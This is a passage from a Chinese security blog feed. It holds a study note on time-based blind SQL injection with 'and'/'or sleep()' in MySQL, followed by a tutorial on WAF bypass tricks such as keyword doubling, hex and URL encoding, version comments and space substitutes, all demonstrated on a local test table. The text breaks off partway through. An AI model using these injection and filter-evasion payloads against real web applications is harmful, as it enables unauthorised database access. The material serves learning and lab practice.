      
        <content type="html"><![CDATA[<p>具体注入流程，不再讲解，下面帖子中有，这里主要探究以及记录自己的一点疑惑，即：为什么查不到结果，进行时间盲注时，就得用or ，用 and 不行？</p><p><ahref="https://www.twblogs.net/a/5cba215abd9eee0eff45eeac/zh-cn">webug4.0 第四关 POST 注入</a></p><h1 id="基础知识">基础知识</h1><h2 id="and-or-短路">and or 短路</h2><p>首先，我们要知道 mysql 的 and 与 or 都有短路效果</p><p>and 和 or 都是操作符，但 and 的有优先级在 or 之前， 也就是在有 and 和or 同时存在的情况，优先计算 and 操作符，然后再计算 or 操作符。</p><blockquote><p>OR MySQL uses short-circuit evaluation for the OR operator. In otherwords, MySQL stops evaluating the remaining parts of the statement whenit can determine the result.</p></blockquote><blockquote><p>AND When evaluating an expression that has the AND operator, MySQLstops evaluating the remaining parts of the expression whenever it candetermine the result. This function is called short-circuitevaluation.</p></blockquote><p>当前面条件满足时 AND 需要执行后边 OR 不需要执行后边当前面条件不满足时 AND 不需要执行后边 OR 需要执行后边</p><h2 id="函数返回值">函数返回值</h2><p>mysql 函数执行成功，返回值为 0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select sleep(2);</span><br><span class="line">+----------+</span><br><span class="line">| sleep(2) |</span><br><span class="line">+----------+</span><br><span class="line">|        0 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (2.00 sec)</span><br></pre></td></tr></table></figure><h1 id="sql-语句详解">sql 语句详解</h1><p>下面我们讲解几个 sql 语句的原理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from tuser;</span><br><span class="line">+------+----------+----------+</span><br><span class="line">| id   | username | passwd   |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">|    1 | admin    | basswd   |</span><br><span class="line">|    1 | adam     | vassword |</span><br><span class="line">|    1 | bob      | gasswd   |</span><br><span class="line">|    2 | colin    | passwd   |</span><br><span class="line">|    2 | doc      | passwd   |</span><br><span class="line">|    3 | doctor   | passwd   |</span><br><span class="line">|    3 | elite    | passwd   |</span><br><span class="line">|    1 | NULL     | passw    |</span><br><span class="line">|    1 | admin    | basswd   |</span><br><span class="line">|    1 | adam     | vassword |</span><br><span class="line">|    1 | bob      | gasswd   |</span><br><span class="line">|    2 | colin    | passwd   |</span><br><span class="line">|    1 | 0        | pass     |</span><br><span class="line">|    1 |          | pas      |</span><br><span class="line">|    1 |  dewe    | ds       |</span><br><span class="line">|    1 |  3fd     | asd      |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">16 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>首先，可以看到 tuser 表中有 16 条数据，其中两条编号为 3 的数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from tuser where id=3 or sleep(3);</span><br><span class="line">+------+----------+--------+</span><br><span class="line">| id   | username | passwd |</span><br><span class="line">+------+----------+--------+</span><br><span class="line">|    3 | doctor   | passwd |</span><br><span class="line">|    3 | elite    | passwd |</span><br><span class="line">+------+----------+--------+</span><br><span class="line">2 rows in set (42.01 sec)</span><br></pre></td></tr></table></figure><p>上面这条语句 mysql 会遍历每一条记录，在遍历到一条记录时，它会依次执行where 后面的条件。总共有两步操作：</p><p>先判断 id=3 与否，因为是 or 连接两种操作，所以如果id=3，那么后面的操作便被短路，不再执行。如果 id 不等于3，执行后面操作，这里就是执行函数 sleep(3)</p><p>上面执行时间计算：一共 16 条数据，14 条 id 不为 3，会执行sleep(3)。因此是 14*3=42，然后再加上 0.01 秒的其他时间。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tuser <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> sleep(<span class="number">3</span>);</span><br><span class="line"><span class="keyword">Empty</span> <span class="keyword">set</span> (<span class="number">33.01</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="number">3</span><span class="operator">*</span><span class="built_in">count</span>(<span class="operator">*</span>)`sleep的时间` <span class="keyword">from</span> tuser <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+</span></span><br><span class="line"><span class="operator">|</span> sleep的时间    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+</span></span><br><span class="line"><span class="operator">|</span>             <span class="number">33</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>上面，我们使用 id =1 and sleep(3)，即：当 id = 1 时，由于是 and不能确定结果，所以还会执行 sleep() 函数。当 id =1 为假时，可以确定整个and 表达式的值，就不会执行后面的语句。</p><p>小结：</p><p>当记录中 id 没有匹配条件时，使用 and sleep(3)没用，因为前面就能确定表达式结果为假了。</p><p>当记录中 id 全部匹配条件时，使用 or sleep(3)没用，因为前面就能确定表达式结果为真了。</p><p>下面测试一些报错的函数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tuser <span class="keyword">where</span> id<span class="operator">=</span><span class="number">10</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x23</span>,version()));</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;#8.0.12&#x27;</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tuser <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">or</span> sleep(<span class="number">2</span>) <span class="keyword">or</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x23</span>,version()));</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;#8.0.12&#x27;</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tuser <span class="keyword">where</span> id<span class="operator">=</span><span class="number">10</span> <span class="keyword">and</span> pow(<span class="number">999</span>,<span class="number">3241324</span>);</span><br><span class="line">ERROR <span class="number">1690</span> (<span class="number">22003</span>): <span class="keyword">DOUBLE</span> <span class="keyword">value</span> <span class="keyword">is</span> <span class="keyword">out</span> <span class="keyword">of</span> <span class="keyword">range</span> <span class="keyword">in</span> <span class="string">&#x27;pow(999,3241324)&#x27;</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tuser <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> pow(<span class="number">999</span>,<span class="number">32414</span>);</span><br><span class="line">ERROR <span class="number">1690</span> (<span class="number">22003</span>): <span class="keyword">DOUBLE</span> <span class="keyword">value</span> <span class="keyword">is</span> <span class="keyword">out</span> <span class="keyword">of</span> <span class="keyword">range</span> <span class="keyword">in</span> <span class="string">&#x27;pow(999,32414)&#x27;</span></span><br></pre></td></tr></table></figure><p>注：从上面表的数据知道，tuser 表中没有 id =10 的记录。</p><p>测试发现不管记录中有没有匹配的 id，不管是用 and 或or，都可以报错。这个的具体原理咱也不清楚，测试着就是这样。</p><p>当然，webug 的 post 注入这关，不显示报错信息，咱不能用报错盲注。</p><p>总结：</p><ol type="1"><li><p>在 where id=1 后面加 and/or函数，不会影响筛选结果（当然，报错的除外，报错就没结果了。）</p></li><li><p>养成习惯，使用时间盲注的时候，and sleep(3) 和 or sleep(3)都试试。</p></li><li><p>报错注入时，使用 and/or，对我们注入来说，没区别。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> sql injection </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>php+mysql 绕 WAF 基础</title>
      <link href="/blog/2019/08/04/websec/sql_injection/php-mysql-cross-waf/"/>
      <url>/blog/2019/08/04/websec/sql_injection/php-mysql-cross-waf/</url>
      
        <content type="html"><![CDATA[<p>本文只针对 php mysql 绕过 WAF的一些基础方式做一些总结记录，写这篇笔记的初衷是因为虽然在网上也能找到讲解这些技巧的文章，但是不知道为什么这种方式可以绕过？就很别扭。于是，想总结一下原因。如果有不恰当的地方欢迎下方留言告诉我。</p><p>有些思路可能对别的环境适用，但是在这里我并不想将其混起来谈，每个平台都有其特点，谈到其他平台时，如果有思想相似的，我会再单独写笔记记录的。</p><h1 id="基础绕过方式">基础绕过方式：</h1><h2 id="双字符也称双写替换关键字">双字符（也称双写、替换关键字）</h2><p>比如：对 and or union select 等单个字的检测，可以使用oorr，anandd，uniunionon，selselectect 等绕过。</p><p>适用：一般情况下，开发者会写一个函数，用来过滤需要过滤的东西。这里会用正则表达式匹配or and等他想要过滤的关键字，然后调用函数，将采参数传递进去进行检测。开发者在对and 等关键字进行过滤时，往往使用正则匹配，如果正则匹配中没有使用 g参数，即：循环匹配，那么我们就可以使用双字符绕过。</p><h2 id="数学符号绕过">数学符号绕过</h2><h3 id="and-or-过滤绕过">and or 过滤绕过</h3><p>and 可以用 &amp;&amp; 代替，但是注意由于 &amp; 在 url中特殊作用（例如：连接 get 参数），所以使用时需要进行 url 编码。</p><p>or 可以用 || 代替，注意：||不用 url编码，直接用即可，因为它不是什么特殊，保留字什么的。</p><p>适用：好多 WAF 只对 and、or的英文单词进行了正则匹配，没有对其对应字符进行匹配。</p><p>原因：比如：基于黑名单的 WAF，不会对收到的 HTTP报文进行解码，再比如：WAF 厂商疏忽大意（....）</p><p>注：对于 符号&amp;（未编码的&amp;）再进行 url 解码，也还是&amp;。</p><h3 id="比较操作符绕过">比较操作符绕过</h3><p>在使用盲注的时候，在爆破的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest，strcmp, in, between 来进行绕过了。</p><p>GREATEST(n1,n2,n3,..........)</p><p>GREATEST()函数返回输入参数(n1, n2, n3, 等)组的最大值。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tuser <span class="keyword">where</span> passwd<span class="operator">=</span><span class="string">&#x27;passwd&#x27;</span> <span class="keyword">and</span> greatest(ascii(substr(version(),<span class="number">1</span>,<span class="number">1</span>)),<span class="number">1</span>)<span class="operator">&lt;</span><span class="number">56</span>;</span><br></pre></td></tr></table></figure><p>本例中使用：ascii(substr(version(),1,1)) 与 1比较，当然是返回前者，然后我们通过与 ASCII码字符比较，看页面显示正常与否来猜字符。（注：8 的 ascii 码为 56）</p><p>strcmp (str1, str2)</p><p>比较两个字符串，如果这两个字符串相等返回0，如果第一个参数是根据当前的排序小于第二个参数顺序返回 -1，否则返回1。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tuser <span class="keyword">where</span> passwd<span class="operator">=</span><span class="string">&#x27;passwd&#x27;</span> <span class="keyword">and</span> strcmp(ascii(substr(version(),<span class="number">1</span>,<span class="number">1</span>)),<span class="number">56</span>);</span><br></pre></td></tr></table></figure><p>这个与上面有些不同的是，相等时返回零，页面显示不正常，当然，如果你觉得别扭，可以在前面加一个！取反。</p><h2 id="mysql-c-风格注释变体">mysql C 风格注释变体</h2><p>补充：mysql 的注释：</p><ul><li><p>单行注释：# 或 -- （两个连字符加一个 whitespace或者控制字符，比如：空格，tab，换行等)</p></li><li><p>C 风格注释（可跨行注释，可内联注释）：/**/</p></li><li><p>C 风格注释的变体：/*!*/</p></li></ul><p>C 风格注释的变体：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*! MySQL-specific code */</span></span><br></pre></td></tr></table></figure><p>MySQL 服务器能够解析并执行注释中的代码，就像对待其他 MySQL语句一样，但其他 SQL服务器将忽略这些扩展。通过此格式的注释，您可以编写包含 MySQL扩展的代码，而且是可移植的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select /*! id,username */ from tuser limit 4;</span><br><span class="line">+------+----------+</span><br><span class="line">| id   | username |</span><br><span class="line">+------+----------+</span><br><span class="line">|    1 | admin    |</span><br><span class="line">|    1 | adam     |</span><br><span class="line">|    1 | bob      |</span><br><span class="line">|    2 | colin    |</span><br><span class="line">+------+----------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>注：该注释可以包裹关键字等，但是不可以插在单个关键字的字母中间。</p><p>此外，如果在<code>!</code> 字符后添加版本号，则仅当 MySQL版本大于或等于指定的版本号时，才会执行注释中的语法。此特性，让开发者编写mysql 扩展的时候，可以使用它来控制引入的库，便于不同版本的移植等。比如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="comment">/*!55602 TEMPORARY */</span> <span class="keyword">TABLE</span> t (a <span class="type">INT</span>);</span><br></pre></td></tr></table></figure><p>当 mysql 的版本<strong>大于等于</strong>5.56.02 时，mysql 将不会注释TEMPOARY，</p><p>即在版本大于等于 5.56.02 的 mysql 中该语句就相当于：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> TEMPORARY <span class="keyword">TABLE</span> t (a <span class="type">INT</span>);</span><br></pre></td></tr></table></figure><p>比如在我的 mysql 8.0.12 上，测试</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> version();</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+</span></span><br><span class="line"><span class="operator">|</span> version() <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">8.0</span><span class="number">.12</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="comment">/*!80012 select */</span> <span class="number">1</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">---+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="comment">/*!80013 select */</span> <span class="number">1</span>;</span><br><span class="line">ERROR <span class="number">1064</span> (<span class="number">42000</span>): You have an error <span class="keyword">in</span> your <span class="keyword">SQL</span> syntax; <span class="keyword">check</span> the manual that corresponds <span class="keyword">to</span> your MySQL server version <span class="keyword">for</span> the <span class="keyword">right</span> syntax <span class="keyword">to</span> use near <span class="string">&#x27;1&#x27;</span> <span class="keyword">at</span> line <span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="大小写绕过">大小写绕过</h2><p>关键字大小写绕过用于只针对小写或大写的关键字匹配技术。</p><p>原理：正则表达式/express/i匹配时大小写不敏感便无法绕过。这是最简单的绕过技术，不过现在直接使用这种绕过技术成功的可能性已经不高了。</p><h2 id="编码绕过">编码绕过</h2><h3 id="url-编码绕过">url 编码绕过</h3><p>使用%加 16 进制的 url 编码对某些 sql 关键字，如：union，select、from等进行编码来绕过 waf 的检测.</p><p>原理：</p><p>从 url编码规范中，我们知道，不对英文大小写字母以及一些特殊字、保留字等进行 url编码（但是其 url 编码是存在的。），对非保留字（如：中文，&amp;，#等）进行 url 编码，而 web 服务器才不管那些，它直接一股脑地将 url全部进行解码来确定接收参数和定位资源。</p><p>对于英文字母的 url 标准不进行编码的字符来说，你对它进行 url编码或解码它还是其本身。</p><p>url 编码规定：字符对应的 16 进制，把前面的 0x 换成 %，即为字符的 url编码。因此我们利用这一点，可以对那些 url 本来不编码的英文字母进行 16进制编码，然后将 0x 换为 %。web服务器在解码的时候，也会将其解码为正常的英文字母，但是基于黑名单的 WAF只匹配关键字，不进行解码，那就可以绕过了。但是碰上解码的WAF，这种方法就是失效了。</p><p>比如：将 union 中的 u 编码为：%75，即：%75nion</p><h3 id="十六进制编码绕过">十六进制编码绕过</h3><p><strong>使用 16进制代替字符串</strong>，当然，这里的字符串可以是很多东西，比如：information_schema.schemata中的一个具体的库名的字符串，也可以是 information_schema.tables中一个具体的表名的字符串，也可以是一个表中具体的字段的字符串等。淡然，我们注入一般只在where 条件筛选时会用到它。如果 WAF对某些表/字段的关键字（如：admin，password等）进行过滤时，我们可以尝试采用它。</p><p>tuser 对应的十六进制为：0x7475736572，因此，我们可以用 wheretable_name=0x7475736572 来代替 where table_name='tuser'</p><p>test 对应的十六进制为：0x74657374，因此，我们可以用 whereschema_name=0x74657374 来代替 where schema_name='tuser'</p><p>通过这样，我们可以绕过两种过滤：一种是对某些敏感关键字，如：admin、passwd等，一种是对引号的过滤，因为我们使用 16 进制，就不再需要引号了。</p><p>举例子：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tuser <span class="keyword">where</span> passwd<span class="operator">=</span><span class="number">0x706173737764</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+--------+</span></span><br><span class="line"><span class="operator">|</span> id   <span class="operator">|</span> username <span class="operator">|</span> passwd <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+--------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">2</span> <span class="operator">|</span> colin    <span class="operator">|</span> passwd <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">2</span> <span class="operator">|</span> doc      <span class="operator">|</span> passwd <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">3</span> <span class="operator">|</span> doctor   <span class="operator">|</span> passwd <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">3</span> <span class="operator">|</span> elite    <span class="operator">|</span> passwd <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">2</span> <span class="operator">|</span> colin    <span class="operator">|</span> passwd <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+--------+</span></span><br><span class="line"><span class="number">5</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> information_schema.schemata <span class="keyword">where</span> schema_name<span class="operator">=</span><span class="number">0x74657374</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+-------------+----------------------------+------------------------+----------+</span></span><br><span class="line"><span class="operator">|</span> CATALOG_NAME <span class="operator">|</span> SCHEMA_NAME <span class="operator">|</span> DEFAULT_CHARACTER_SET_NAME <span class="operator">|</span> DEFAULT_COLLATION_NAME <span class="operator">|</span> SQL_PATH <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+-------------+----------------------------+------------------------+----------+</span></span><br><span class="line"><span class="operator">|</span> def          <span class="operator">|</span> test        <span class="operator">|</span> utf8                       <span class="operator">|</span> utf8_general_ci        <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+-------------+----------------------------+------------------------+----------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> table_schema,table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_name<span class="operator">=</span><span class="number">0x7475736572</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+------------+</span></span><br><span class="line"><span class="operator">|</span> TABLE_SCHEMA <span class="operator">|</span> TABLE_NAME <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+------------+</span></span><br><span class="line"><span class="operator">|</span> test         <span class="operator">|</span> tuser      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><h3 id="编码函数绕过">编码函数绕过</h3><ol type="1"><li><p>mysql 中的 char()函数会将每一个参数（参数用逗号分隔）都解释为整数，返回由这些整数在 ASCII码中所对应字符所组成的字符串。忽略 NULL 值。</p><blockquote><p>MySQL CHAR() returns the character value of the given integer valueaccording to the ASCII table. It ignores the NULL value.</p></blockquote><p>比如: test 对应 ASCII 码为：116 101 115 116，那么可以用 char(116,101, 115, 116) 代替 test 字符串。</p><p>原理：当然很简单，<strong>有的 WAF</strong>只用正则匹配关键字，你写成 ASCII 码，也不是 URL解码能解出来的，所以它识别不出来，当然，如果 WAF 直接把 char给列入黑名单，那就凉凉喽。</p></li></ol><h1 id="等价函数绕过">等价函数绕过</h1><p>hex()、bin()、ascii()</p><p>sleep()、benchmark()</p><p>concat_ws()、group_concat()、concat</p><p>mid()、substr()、substring()</p><p>@<span class="citation"data-cites="version">@version</span>、version()</p><p>未完待续...</p><h1 id="宽字节绕过">宽字节绕过</h1><p>暂未学习，学完再补充</p><h1 id="空格过滤绕过">空格过滤绕过</h1><p>方法比较琐碎，且有些方法普适性不大，大部分都是针对空格过滤的，因此，这里的题目是空格过滤绕过。</p><h2 id="编码">编码</h2><p>两个空格代替一个空格，用 Tab 代替空格</p><p>%a0 空格 %0a 新建一行 %0b TAB 键（垂直）</p><p>%09 TAB 键（水平） %0c 新的一页 %0d return 功能</p><p>由于不同平台等不同，大佬总结的咱也不好说，一般先使用%a0，%0a，%0b，%b0 等测试。</p><p>下面是天书上的一段话：</p><blockquote><p>%a0 是空格的意思，（ps：此处我的环境是ubuntu14.04+apache+mysql+php，可以解析%a0，此前在 windows+wamp测试，不能解析%a0，有知情的请告知。）同时%0b也是可以通过测试的，其他的经测试是不行的。||是或者的意思，'1则是为了闭合后面的 ' 。</p></blockquote><p>常用的 URL 编码中，会把空格编码成%20，所以通过浏览器发包，进行的 URL编码中，空格被编码成%20。在 HTML编码中，还有一个编码可以取代空格，也就是%a0</p><p>这个算是一个不成汉字的中文字符了，那这应该就好理解了，因为%a0的特性，在进行正则匹配时，匹配到它时是识别为中文字符：�，所以不会被过滤掉，但是在进入SQL 语句后，Mysql 是不认中文字符的，所以直接当作空格处理</p><h2 id="多行注释">多行注释</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select<span class="comment">/**/</span>id <span class="keyword">from</span> tuser limit <span class="number">4</span>;</span><br><span class="line">+------+</span><br><span class="line">| id   |</span><br><span class="line">+------+</span><br><span class="line">|    <span class="number">1</span> |</span><br><span class="line">|    <span class="number">1</span> |</span><br><span class="line">|    <span class="number">1</span> |</span><br><span class="line">|    <span class="number">2</span> |</span><br><span class="line">+------+</span><br><span class="line"><span class="number">4</span> rows in <span class="title function_ invoke__">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>直接在需要空格的地方补一对多行注释即可。但是，当/*或*/被过滤的时候，就不好用了。</p><h2 id="括号">括号</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>(id),(username)<span class="keyword">from</span>(tuser)<span class="keyword">where</span>(id<span class="operator">=</span><span class="number">1</span>)<span class="keyword">union</span>(<span class="keyword">select</span>(<span class="number">1</span>),(<span class="number">2</span>));</span><br></pre></td></tr></table></figure><h2 id="运算符与小数点">运算符与小数点</h2><p>我们知道 mysql 允许 select 时对字段进行算术运算，比如：select 2*idfromxx；等。而我们还需要知道在计算机中，取正取负也算是一种算数运算。</p><p>针对数字前后空格的：+ - .即：正号（加号），负号（减号），浮点（小数点）。</p><p>整型前面的空格：</p><p>+-可以放在数字型字段名前面作为正负号（如：+1，-2，+id），这样一方面字段进行了取整取负的算术运算，另一方方面，由于有符号隔开其与前面的关键字select 或其他字段，mysql 就不再需要空格了。</p><p>整型后面的空格：</p><p>方法一：</p><p>浮点（小数点）可以放在整型字段后面充当小数点..，小数点之后有没有小数位都成。但是虽然它作为一个符号就将其前面的整型字段与后面的关键字或字段隔开了，mysql就不再要求空格了，但是加小数点可不算一种运算，那这样就会报错。</p><p>这里你需要知道在整型字段后面用+、-，那就是四则运算中的加减号了,+或-左右需要都有运算数，比如：id+1-1等。</p><p>因此我们可以采用：id+1-1. 即：id 加整型 1 然后减去浮点数1.的方式使他不报错，而且 id的值不变。这种方式就可以省略整型字段后面的空格了。</p><p>方法二：</p><p>科学计数法上场</p><p>a*10^b 写作：aeb</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span><span class="operator">+</span><span class="number">1e0</span><span class="keyword">from</span> tuser limit <span class="number">0</span>,<span class="number">4</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1e0</span> <span 